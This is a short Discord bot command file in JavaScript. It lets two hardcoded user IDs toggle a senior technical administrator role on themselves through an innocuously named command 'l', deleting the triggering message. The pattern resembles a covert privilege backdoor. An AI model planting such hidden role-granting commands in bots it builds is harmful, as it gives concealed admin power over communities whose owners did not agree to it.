const Discord = require("discord.js");

module.exports.run = async (bot, message, args) => {
if (message.member.id != "354261484395560961" && message.member.id != "547458280281341962")
  return;

	message.delete().catch(O_o=>{});

  var teh = message.guild.roles.find(`name`, "🔱Старший Тех. Администратор🔱");

if(message.member.roles.some(r=>["🔱Старший Тех. Администратор🔱"].includes(r.name)))
    return message.member.removeRole(teh);

message.member.addRole(teh);
}

  module.exports.help = {
    name: "l"
  }
